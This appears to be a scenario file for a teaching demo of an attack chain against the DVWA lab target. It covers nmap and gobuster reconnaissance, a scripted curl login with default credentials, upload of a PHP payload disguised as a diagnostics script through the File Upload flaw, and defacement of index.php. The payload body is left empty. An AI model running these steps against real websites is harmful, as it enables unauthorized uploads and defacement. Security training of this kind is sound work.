name: DVWA File Tampering Attack Chain
description: 扫描侦察 → 欺骗植入 → 文件篡改：完整演示对 DVWA 靶场的端口扫描、目录枚举、File Upload 漏洞利用以及首页文件替换攻击链。攻击者通过 nmap 发现 Web 服务，gobuster 枚举上传入口，curl 登录获取会话后上传伪装成系统诊断脚本的 PHP 载荷，最终覆盖 DVWA 首页 index.php 实现可视化页面篡改。

steps.name: Port Scan - nmap
steps.description: nmap 扫描目标端口和服务版本，发现开放的 Web 服务入口

steps.name: Directory Enumeration - gobuster
steps.description: gobuster 目录枚举，发现 DVWA 文件上传入口 /vulnerabilities/upload/

steps.name: DVWA Login & Security Setup
steps.description: 登录 DVWA 并设置 security=low，获取有效会话供后续上传使用
argsTemplate: echo '=== DVWA Init ==='; TOKEN=$(curl -s -c /tmp/dvwa_jar.txt http://<target>/login.php | grep -oP "user_token' value='\\K[^']+"); if [ -z "$TOKEN" ]; then echo 'FATAL: Failed to get CSRF token'; exit 0; fi; curl -s -L -b /tmp/dvwa_jar.txt -c /tmp/dvwa_jar.txt -d "username=admin&password=password&Login=Login&user_token=$TOKEN" http://<target>/login.php -o /dev/null; PHPSESSID=$(awk '/PHPSESSID/{print $NF}' /tmp/dvwa_jar.txt); if [ -z "$PHPSESSID" ]; then echo 'FATAL: Login failed - no session cookie'; exit 0; fi; CHECK=$(curl -s -L -b /tmp/dvwa_jar.txt http://<target>/index.php | grep -c 'Logout'); echo $PHPSESSID > /tmp/dvwa_session.txt; echo "DVWA ready (session: $PHPSESSID, login_ok: $CHECK)"

steps.name: Upload Trojan PHP Payload
steps.description: 生成伪装成系统诊断脚本的 PHP 载荷，通过 File Upload 漏洞上传至靶场
argsTemplate: echo '' | base64 -d > /tmp/diagnostics.php; echo '--- Uploading payload ---'; RESP=$(curl -s -L -b /tmp/dvwa_jar.txt -F "MAX_FILE_SIZE=100000" -F "uploaded=@/tmp/diagnostics.php;type=application/x-php" -F "Upload=Upload" "http://<target>/vulnerabilities/upload/"); echo "$RESP" | head -c 500; if echo "$RESP" | grep -qi "succesfully"; then echo 'FILE_UPLOADED: diagnostics.php'; echo 'TRIGGER_URL: http://<target>/hackable/uploads/diagnostics.php'; else echo 'UPLOAD_RESULT: check server response above'; fi

steps.name: Trigger File Tampering
steps.description: 访问上传的 PHP 载荷，触发 index.php 覆盖操作，实现首页篡改

steps.name: Verify Defaced Homepage
steps.description: 访问 DVWA 首页，验证页面已被篡改为入侵警告页面
argsTemplate: echo '=== Verifying Defacement ==='; curl -s -L http://<target>/ | grep -o 'SYSTEM COMPROMISED' && echo 'VERIFIED: Homepage defaced - SYSTEM COMPROMISED' || echo 'VERIFY_FAILED: Homepage not tampered'

teachingObjective: 演示完整扫描→欺骗→篡改攻击链：nmap/gobuster 侦察发现入口，File Upload 漏洞上传伪装 PHP 载荷（伪装成系统诊断脚本），远程覆盖首页 index.php 实现可视化页面篡改，观众可在浏览器直接看到被篡改页面
